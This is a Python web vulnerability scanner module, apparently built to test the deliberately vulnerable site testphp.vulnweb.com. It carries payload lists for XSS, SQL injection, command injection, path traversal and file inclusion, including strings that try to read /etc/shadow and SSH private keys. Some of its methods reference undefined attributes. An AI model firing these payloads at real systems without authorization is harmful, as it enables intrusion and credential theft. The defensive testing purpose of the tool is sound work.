"""Web Vulnerability Scanner Module for DefSec"""
import requests
import re
from urllib.parse import urljoin, parse_qs, urlparse, urlencode
from bs4 import BeautifulSoup
from rich.console import Console
import time
from typing import List, Dict, Set
import concurrent.futures
from itertools import islice
import random

console = Console()

class WebVulnScanner:
    def __init__(self, target: str):
        self.target = target if target.startswith(('http://', 'https://')) else f'http://{target}'
        self.visited_urls: Set[str] = set()
        self.forms: List[Dict] = []
        self.max_workers = 10
        self.batch_size = 50
        self.request_delay = 0.1
        self.max_retries = 2
        self.timeout = 5
        self.max_depth = 3

        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close'
        }

        # Specific paths for testphp.vulnweb.com
        self.vulnerable_paths = [
            "/",
            "/login.php",
            "/search.php",
            "/artists.php",
            "/Guestbook.php",
            "/comment.php",
            "/reviewit.php",
            "/listproducts.php",
            "/product.php",
            "/secured/newuser.php",
            "/AJAX/index.php",
            "/categories/",
            "/artists/",
            "/Cart/",
            "/admin/",
            "/userinfo.php",
            "/hpp/",
            "/pictures/",
            "/register.php"
        ]

        self.results = {
            'xss_vulnerabilities': [],
            'sqli_vulnerabilities': [],
            'rce_vulnerabilities': [],
            'traversal_vulnerabilities': [],
            'lfi_vulnerabilities': [],
            'admin_panels': [],
            'detected_forms': [],
            'crawled_urls': set(),
            'directories': set(),
            'poc_generated': []
        }

        console.print("[info]Initializing enhanced web vulnerability scanner...[/]")

        # Load test payloads
        self.xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '\'"--></style></script><script>alert(1)</script>',
            '<svg/onload=alert(1)>',
            'javascript:alert(1)//',
            '"><svg onload=alert(1)>',
            '\'"</script><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<ScRiPt>alert(1)</ScRiPt>'
        ]

        self.sqli_payloads = [
            "'",
            "' OR '1'='1",
            "' OR 1=1--",
            "admin' --",
            "' UNION SELECT NULL,NULL--",
            "') OR ('1'='1",
            "' OR 1=1#",
            "')) OR 1=1--",
            "admin'/*",
            "' AND 1=0 UNION ALL SELECT NULL,NULL,NULL--",
            "1' ORDER BY 3--",
            "1' ORDER BY 4--"
        ]

        self.rce_payloads = [
            ';id',
            '|id',
            '`id`',
            '$(id)',
            '; cat /etc/passwd',
            '& whoami &',
            '| whoami |',
            '; uname -a #',
            '|| whoami ||'
        ]

        # Load optimized wordlists
        self.common_dirs = self._load_common_dirs()
        self.traversal_payloads = self._load_traversal_payloads()
        self.lfi_payloads = self._load_lfi_payloads()


    def scan(self) -> Dict:
        """Enhanced scanning with optimized approach"""
        try:
            console.print("[info]Starting optimized vulnerability scan...[/]")

            # First crawl the known vulnerable paths
            for path in self.vulnerable_paths:
                url = urljoin(self.target, path)
                try:
                    response = self._make_request(url)
                    if response and response.status_code == 200:
                        self.visited_urls.add(url)
                        self.results['directories'].add(url)

                        # Extract and test forms
                        forms = self._extract_forms(url)
                        for form in forms:
                            self._test_form_vulnerabilities(form)

                        # Test for vulnerabilities in URL parameters
                        self._test_url_vulnerabilities(url)

                        # Extract additional links for crawling
                        self._extract_links(response.text, url)
                except Exception as e:
                    console.print(f"[warning]Error scanning {url}: {str(e)}[/]")

            # Then do directory enumeration
            self._enumerate_directories()
            console.print(f"[info]Found {len(self.results['directories'])} directories[/]")

            # Now crawl discovered links
            discovered_urls = list(self.visited_urls)
            for url in discovered_urls:
                try:
                    response = self._make_request(url)
                    if response and response.status_code == 200:
                        # Test for vulnerabilities
                        self._test_url_vulnerabilities(url)

                        # Extract and test forms
                        forms = self._extract_forms(url)
                        for form in forms:
                            self._test_form_vulnerabilities(form)

                except Exception as e:
                    console.print(f"[warning]Error processing {url}: {str(e)}[/]")

            console.print("[info]Scan completed successfully[/]")
            self._print_scan_summary()
            return self.results

        except Exception as e:
            console.print(f"[error]Critical error during web vulnerability scan: {str(e)}[/]")
            return self.results
    def _enumerate_directories(self):
        """Enumerate directories using wordlist"""
        base_url = self.target.rstrip('/')

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = {
                executor.submit(self._check_directory, f"{base_url}{dir_path}"): dir_path
                for dir_path in self.common_dirs
            }

            for future in concurrent.futures.as_completed(futures):
                try:
                    url = future.result()
                    if url:
                        self.results['directories'].add(url)
                except Exception:
                    continue

    def _check_directory(self, url: str) -> str:
        """Check if a directory exists"""
        try:
            response = requests.head(url, headers=self.headers, timeout=5, allow_redirects=True, verify=False)
            if response.status_code in [200, 301, 302, 403]:
                return url
        except:
            pass
        return ""


    def _make_request(self, url: str, method: str = 'GET', data: Dict = None, allow_redirects: bool = True) -> requests.Response:
        """Make a request with retry logic and proper error handling"""
        for attempt in range(self.max_retries):
            try:
                time.sleep(self.request_delay)
                if method.upper() == 'GET':
                    response = requests.get(
                        url,
                        headers=self.headers,
                        timeout=self.timeout,
                        allow_redirects=allow_redirects,
                        verify=False
                    )
                else:
                    response = requests.post(
                        url,
                        headers=self.headers,
                        data=data,
                        timeout=self.timeout,
                        allow_redirects=allow_redirects,
                        verify=False
                    )
                return response
            except requests.RequestException:
                if attempt == self.max_retries - 1:
                    raise
                time.sleep(2 ** attempt)
        return None
    def _load_common_dirs(self) -> List[str]:
        """Load common directory paths for scanning"""
        return [
            "/admin", "/images", "/uploads", "/backup", "/include",
            "/temp", "/tmp", "/assets", "/files", "/login", "/admin.php",
            "/config", "/db", "/database", "/admin/login", "/admin/index",
            "/test", "/testing", "/dev", "/development", "/staging",
            "/old", "/new", "/beta", "/demo", "/sample", "/examples",
            "/js", "/javascript", "/css", "/styles", "/imgs", "/pictures",
            "/docs", "/documentation", "/api", "/rest", "/soap", "/services",
            "/auth", "/authenticate", "/login.php", "/register.php",
            "/wp-admin", "/wp-content", "/wp-includes", "/administrator",
            "/joomla", "/cms", "/portal", "/forum", "/board", "/include",
            "/includes", "/inc", "/lib", "/library", "/libraries",
            "/cgi-bin", "/bin", "/app", "/apps", "/application",
            "/setup", "/install", "/installation", "/manual", "/guide",
            "/download", "/downloads", "/dl", "/upload", "/uploads"
        ]

    def _extract_forms(self, url: str) -> List[Dict]:
        """Extract forms from a URL"""
        forms = []
        try:
            response = self._make_request(url)
            if not response:
                return forms

            soup = BeautifulSoup(response.text, 'html.parser')
            for form in soup.find_all('form'):
                form_info = {
                    'action': urljoin(url, form.get('action', '')),
                    'method': form.get('method', 'get').lower(),
                    'inputs': []
                }

                # Get all input fields
                for input_tag in form.find_all(['input', 'textarea']):
                    input_info = {
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    }
                    if input_info['name']:  # Only add inputs with names
                        form_info['inputs'].append(input_info)

                if form_info['inputs']:  # Only add forms with inputs
                    forms.append(form_info)
                    self.results['detected_forms'].append(form_info)

        except Exception as e:
            console.print(f"[warning]Error extracting forms from {url}: {str(e)}[/]")
        return forms

    def _test_form_vulnerabilities(self, form: Dict):
        """Test a form for various vulnerabilities"""
        if not form.get('inputs'):
            return

        for input_field in form['inputs']:
            if input_field['type'] in ['text', 'search', 'hidden', 'textarea']:
                # Test for XSS
                for payload in self.xss_payloads:
                    try:
                        data = {input_field['name']: payload}
                        response = self._make_request(
                            form['action'],
                            'POST' if form['method'].lower() == 'post' else 'GET',
                            data
                        )
                        if response and self._detect_xss_success(response.text, payload):
                            self.results['xss_vulnerabilities'].append({
                                'url': form['action'],
                                'parameter': input_field['name'],
                                'payload': payload,
                                'type': 'reflected'
                            })
                            break

                    except Exception:
                        continue

                # Test for SQL Injection
                for payload in self.sqli_payloads:
                    try:
                        data = {input_field['name']: payload}
                        response = self._make_request(
                            form['action'],
                            'POST' if form['method'].lower() == 'post' else 'GET',
                            data
                        )
                        if response and self._detect_sql_error(response.text):
                            self.results['sqli_vulnerabilities'].append({
                                'url': form['action'],
                                'parameter': input_field['name'],
                                'payload': payload,
                                'type': 'error-based'
                            })
                            break

                    except Exception:
                        continue

    def _test_url_vulnerabilities(self, url: str):
        """Test URL parameters for vulnerabilities"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            # If no parameters, try some common ones
            test_params = ['id', 'cat', 'artist', 'pid', 'uid', 'page']
            for param in test_params:
                self._test_parameter(url, param)
        else:
            for param in params.keys():
                self._test_parameter(url, param)

    def _test_parameter(self, url: str, param: str):
        """Test a specific parameter for vulnerabilities"""
        # Test for XSS
        for payload in self.xss_payloads:
            try:
                test_url = self._create_test_url(url, param, payload)
                response = self._make_request(test_url)
                if response and self._detect_xss_success(response.text, payload):
                    self.results['xss_vulnerabilities'].append({
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': 'reflected'
                    })
                    break
            except Exception:
                continue

        # Test for SQL Injection
        for payload in self.sqli_payloads:
            try:
                test_url = self._create_test_url(url, param, payload)
                response = self._make_request(test_url)
                if response and self._detect_sql_error(response.text):
                    self.results['sqli_vulnerabilities'].append({
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': 'error-based'
                    })
                    break
            except Exception:
                continue

    def _create_test_url(self, base_url: str, param: str, value: str) -> str:
        """Create a URL with the test parameter"""
        parsed = urlparse(base_url)
        params = parse_qs(parsed.query)
        params[param] = [value]
        query_string = urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"

    def _extract_links(self, html: str, base_url: str):
        """Extract links from HTML content"""
        try:
            soup = BeautifulSoup(html, 'html.parser')
            for link in soup.find_all('a'):
                href = link.get('href')
                if href:
                    url = urljoin(base_url, href)
                    if url.startswith(self.target) and url not in self.visited_urls:
                        self.visited_urls.add(url)
                        self.results['crawled_urls'].add(url)
        except Exception:
            pass

    def _detect_xss_success(self, response_text: str, payload: str) -> bool:
        """Enhanced XSS detection for testphp.vulnweb.com"""
        try:
            # First check for exact payload reflection
            if payload.lower() in response_text.lower():
                # Check for proper context
                if '<script>' in payload.lower():
                    return '<script>' in response_text.lower() and '</script>' in response_text.lower()
                elif 'onerror=' in payload.lower():
                    return 'onerror=' in response_text.lower()
                elif 'onload=' in payload.lower():
                    return 'onload=' in response_text.lower()
                elif '<img' in payload.lower():
                    return '<img' in response_text.lower()
                elif '<svg' in payload.lower():
                    return '<svg' in response_text.lower()
                return True
            return False
        except:
            return False

    def _detect_sql_error(self, response_text: str) -> bool:
        """Enhanced SQL error detection for testphp.vulnweb.com"""
        sql_errors = [
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
            "mysql_fetch_array()",
            "mysql_fetch_assoc()",
            "mysql_num_rows()",
            "mysql_fetch_object()",
            "mysql_query()",
            "mysql_result()",
            "mysql_select_db()",
            "mysql error",
            "sql syntax",
            "mysql warning"
        ]

        response_lower = response_text.lower()
        return any(error.lower() in response_lower for error in sql_errors)
    def _load_traversal_payloads(self) -> List[str]:
        """Load comprehensive directory traversal payloads"""
        return [
            # Basic Traversal
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',

            # URL Encoded
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini',

            # Unicode/UTF-8 Encoding
            '..%c0%af..%c0%af..%c0%afetc/passwd',
            '..%c1%9c..%c1%9c..%c1%9cwindows/win.ini',

            # Path Truncation
            '....//....//....//etc/passwd',
            '....\\\\....\\\\....\\\\windows\\win.ini',

            # WAF Bypass
            '....//....//....//etc/passwd%00.jpg',
            '..;/..;/..;/etc/passwd'
        ]
    def _load_lfi_payloads(self) -> List[str]:
        """Load comprehensive Local File Inclusion payloads"""
        return [
            # Basic LFI
            '/etc/passwd',
            'c:\\windows\\win.ini',
            '/proc/self/environ',

            # PHP Wrappers
            'php://filter/convert.base64-encode/resource=index.php',
            'php://filter/read=string.rot13/resource=index.php',
            'php://input',
            'phar://test.phar',
            'zip://test.zip',

            # Log File Poisoning
            '/var/log/apache2/access.log',
            '/var/log/apache/access.log',
            '/var/log/httpd/access_log',

            # PHP Session Files
            '/var/lib/php/sessions/sess_[SESSION_ID]',
            '/tmp/sess_[SESSION_ID]',

            # System Files
            'c:\\windows\\system32\\drivers\\etc\\hosts',
            '/proc/version',
            '/etc/issue',
            '/etc/shadow',
            '/root/.ssh/id_rsa',

            # Null Byte Injection
            '/etc/passwd%00',
            'c:\\windows\\win.ini%00'
        ]
    def _print_scan_summary(self):
        """Print a comprehensive summary of the scan results"""
        console.print("\n[info]Scan Summary:[/]")
        console.print(f"URLs Crawled: {len(self.visited_urls)}")
        console.print(f"Admin Panels Found: {len(self.results['admin_panels'])}")
        console.print(f"Forms Detected: {len(self.forms)}")
        console.print(f"XSS Vulnerabilities: {len(self.results['xss_vulnerabilities'])}")
        console.print(f"SQL Injection Vulnerabilities: {len(self.results['sqli_vulnerabilities'])}")
        console.print(f"RCE Vulnerabilities: {len(self.results['rce_vulnerabilities'])}")
        console.print(f"Path Traversal Vulnerabilities: {len(self.results['traversal_vulnerabilities'])}")
        console.print(f"File Inclusion Vulnerabilities: {len(self.results['lfi_vulnerabilities'])}")
        console.print(f"POCs Generated: {len(self.results['poc_generated'])}")
    def _generate_pocs(self) -> None:
        """Generate proof of concept for discovered vulnerabilities"""
        for vuln_type in ['xss_vulnerabilities', 'sqli_vulnerabilities', 'rce_vulnerabilities']:
            for vuln in self.results[vuln_type]:
                poc = {
                    'vulnerability_type': vuln_type,
                    'target_url': vuln['url'],
                    'payload': vuln['payload'],
                    'curl_command': f"curl -X GET '{vuln['url']}' -H 'User-Agent: DefSec-Scanner/1.0'",
                    'python_code': self._generate_python_poc(vuln),
                    'verification_steps': self._generate_verification_steps(vuln)
                }
                self.results['poc_generated'].append(poc)
    def _generate_python_poc(self, vuln: Dict) -> str:
        """Generate Python code for POC"""
        return f"""
import requests

url = "{vuln['url']}"
payload = "{vuln['payload']}"
headers = {self.headers}

response = requests.get(url, headers=headers, verify=False)
print(f"Status Code: {response.status_code}")
print(f"Response Length: {len(response.text)}")
"""
    def _generate_verification_steps(self, vuln: Dict) -> List[str]:
        """Generate verification steps for the vulnerability"""
        steps = [
            f"1. Access the target URL: {vuln['url']}",
            f"2. Use the payload: {vuln['payload']}",
            "3. Observe the response for:"
        ]

        if 'xss' in vuln.get('type', '').lower():
            steps.extend([
                "   - JavaScript execution",
                "   - Alert box appearance",
                "   - DOM modifications"
            ])
        elif 'sql' in vuln.get('type', '').lower():
            steps.extend([
                "   - Database error messages",
                "   - Modified query results",
                "   - Authentication bypass effects"
            ])
        elif 'rce' in vuln.get('type', '').lower():
            steps.extend([
                "   - Command execution results",
                "   - System information disclosure",
                "   - File system access"
            ])

        return steps
    def _scan_admin_panels(self) -> None:
        """Scan for admin panels with parallel processing"""
        console.print("[info]Scanning for admin panels...[/]")
        base_url = self.target.rstrip('/')

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for path in self.admin_paths:
                admin_url = f"{base_url}{path}"
                futures.append(executor.submit(self._check_admin_panel, admin_url))

                # Process in smaller batches to avoid overwhelming the server
                if len(futures) >= 20:
                    for future in concurrent.futures.as_completed(futures):
                        try:
                            future.result()
                        except Exception:
                            pass
                    futures = []
                    time.sleep(0.5)  # Brief pause between batches

    def _check_admin_panel(self, url: str) -> None:
        """Check if a potential admin panel exists"""
        try:
            response = self._make_request(url, timeout=5)
            if response.status_code in [200, 301, 302, 403]:
                # Look for login indicators
                login_indicators = [
                    'login', 'admin', 'administrator', 'sign in',
                    'username', 'password', 'usuarios', 'connexion'
                ]
                content_lower = response.text.lower()
                if any(indicator in content_lower for indicator in login_indicators):
                    self.results['admin_panels'].append({
                        'url': url,
                        'status_code': response.status_code,
                        'type': 'Potential Admin Panel',
                        'confidence': 'High' if response.status_code == 200 else 'Medium'
                    })
        except Exception:
            pass
    def _test_rce(self, url: str) -> None:
        """Test for Remote Code Execution vulnerabilities"""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)

        # Test URL parameters
        for param in params:
            for payload in self.rce_payloads:
                test_url = self._create_test_url(url, param, payload)
                try:
                    response = self._make_request(test_url)
                    if self._detect_rce_success(response.text):
                        self.results['rce_vulnerabilities'].append({
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': 'command_injection'
                        })
                except Exception:
                    continue
    def _detect_rce_success(self, response_text: str) -> bool:
        """Check for signs of successful RCE"""
        rce_patterns = [
            r"root:[x*]:0:0:",  # /etc/passwd content
            r"uid=[0-9]+\([a-zA-Z0-9]+\)",  # id command output
            r"Linux.*[0-9]+\.[0-9]+\.[0-9]+",  # uname -a output
            r"Microsoft Windows \[Version [0-9\.]+\]"          ]
        return any(re.search(pattern, response_text) for pattern in rce_patterns)
    def _test_directory_traversal(self, url: str) -> None:
        """Test for Directory Traversal vulnerabilities"""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)

        # Test URL parameters
        for param in params:
            for payload in self.traversal_payloads:
                test_url = self._create_test_url(url, param, payload)
                try:
                    response = self._make_request(test_url)
                    if self._detect_traversal_success(response.text):
                        self.results['traversal_vulnerabilities'].append({
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': 'path_traversal'
                        })
                except Exception:
                    continue
    def _detect_traversal_success(self, response_text: str) -> bool:
        """Check for signs of successful directory traversal"""
        traversal_patterns = [
            r"root:.*:0:0:",  # Unix passwd file
            r"\[boot loader\]",  # Windows win.ini
            r"root:x:[0-9]+:[0-9]+:",  # Linux passwd file
            r"\\WINDOWS\\system32"  # Windows system directory
        ]
        return any(re.search(pattern, response_text) for pattern in traversal_patterns)
    def _test_file_inclusion(self, url: str) -> None:
        """Test for File Inclusion vulnerabilities"""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)

        # Test URL parameters
        for param in params:
            for payload in self.lfi_payloads:
                test_url = self._create_test_url(url, param, payload)
                try:
                    response = self._make_request(test_url)
                    if self._detect_file_inclusion_success(response.text):
                        self.results['lfi_vulnerabilities'].append({
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': 'file_inclusion'
                        })
                except Exception:
                    continue
    def _detect_file_inclusion_success(self, response_text: str) -> bool:
        """Check for signs of successful file inclusion"""
        inclusion_patterns = [
            r"root:.*:0:0:",  # Unix passwd file
            r"PATH=",  # Environment variables
            r"HTTP_USER_AGENT",  # PHP environment
            r"\[boot loader\]",  # Windows win.ini
            r"<\?php"  # PHP code
        ]
        return any(re.search(pattern, response_text) for pattern in inclusion_patterns)